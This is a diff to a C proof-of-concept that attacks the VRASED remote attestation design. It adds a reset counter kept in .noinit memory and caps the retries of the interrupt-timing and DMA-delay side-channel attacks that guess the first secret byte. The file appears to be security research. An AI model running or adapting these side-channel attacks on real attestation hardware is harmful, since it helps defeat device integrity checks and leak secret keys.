@@ -203,8 +203,6 @@ void print_and_compare_regs(char *str1, struct regs_dump *regs_struct1,
         printf("%d non-zero registers leaked!\n", leak);
 }
 
-int have_reset = 0;
-
 /**
  * Demonstrate how VRASED attackers with arbitrary untrusted code execution can
  * detect and persist state across resets (as used in some of the attacks below).
@@ -220,13 +218,15 @@ int have_reset = 0;
  */
 int __attribute__ ((section (".noinit"))) reset_marker;
 int __attribute__ ((section (".noinit"))) attack_iteration;
+int __attribute__ ((section (".noinit"))) have_reset;
 
 void VRASED (uint8_t *challenge, uint8_t *response) {
     if (reset_marker == 0xdead)
-        have_reset = 1;
+        have_reset++;
     else {
         reset_marker = 0xdead;
         attack_iteration = 0;
+        have_reset = 0;
     }
 
     printf("Attack: %d; have_reset: %d\n", __ATTACK, have_reset);
@@ -298,7 +298,7 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     #endif
 
     #if __ATTACK == 5
-      if (have_reset) {
+      if (have_reset > 0 && have_reset <= 2) {
         uint16_t delay = *((uint16_t*) DMA_ATTACKER_RESET_CNT);
         printf("Interrupt delay: %u\n", delay);
 
@@ -312,7 +312,12 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
          * was correctly guessed.
          * */
         if (delay == 14486) {
-          printf("First byte not guessed, retrying\n");
+          if (have_reset == 1) {
+            printf("First byte not guessed, retrying\n");
+          } else {
+            printf("PoC failed\n");
+            return;
+          }
         } else {
           printf("First byte guessed, finishing\n");
           return;
@@ -328,7 +333,7 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     #endif
 
     #if __ATTACK == 6
-      if (have_reset) {
+      if (have_reset > 0 && have_reset <= 2) {
         uint16_t delayed = *((uint16_t*) DMA_ATTACKER_DELAYED);
         printf("DMA delayed: %s\n", delayed ? "Yes" : "No");
 
@@ -341,7 +346,12 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
          * guessed value was correct.
          * */
         if (!delayed) {
-          printf("First byte not guessed, retrying\n");
+          if (have_reset == 1) {
+            printf("First byte not guessed, retrying\n");
+          } else {
+            printf("PoC failed\n");
+            return;
+          }
         } else {
           printf("First byte guessed, finishing\n");
           return;
